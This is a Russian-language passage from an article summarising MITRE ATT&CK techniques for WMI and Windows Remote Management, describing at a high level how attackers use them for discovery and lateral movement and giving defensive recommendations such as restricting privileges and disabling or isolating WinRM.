_Описание:_ WMI — это инструментарий для администрирования Windows, который обеспечивает возможность локального и удаленного доступа к системным компонентам Windows. WMI использует SMB и RPCS (работает на порту 135). Злоумышленники могут использовать WMI для взаимодействия с локальными и удаленными системами, а также в качестве средства для выполнения многих тактических операций, таких как сбор информации на этапе обзора ресурсов (discovery) и удаленного выполнения файлов в ходе «продвижения в стороны» (literal movement).

_Рекомендации по защите:_ Отключение WMI и RPCS может привести к нестабильности системы. По умолчанию, только администраторы могут удаленно подключаться к системе по WMI. Предотвратите совпадение прав у административных и других привилегированных учетных записей.

### [Windows Remote Management (WinRM)](https://attack.mitre.org/wiki/Technique/T1028)

_Система:_ Windows  
_Права:_ Пользователь, администратор  
_Описание:_ Windows Remote Management (WinRM) — это имя службы и протокола, который позволяет удаленное взаимодействие пользователя с системой (например, запуск файла, изменение реестра, изменение службы. Для запуска используется команда winrm и другие программы, такие как PowerShell.

_Рекомендации по защите:_ Отключите службу WinRM. Если она необходима, то изолируйте инфраструктуру с WinRM с отдельными учетными записями и разрешениями. Следуйте _[рекомендациям WinRM](https://docs.microsoft.com/en-us/windows/desktop/winrm/portal)_ по настройке методов проверки подлинности и использованию брандмауэров хоста, чтобы разрешить доступ к WinRM только с определенных устройств.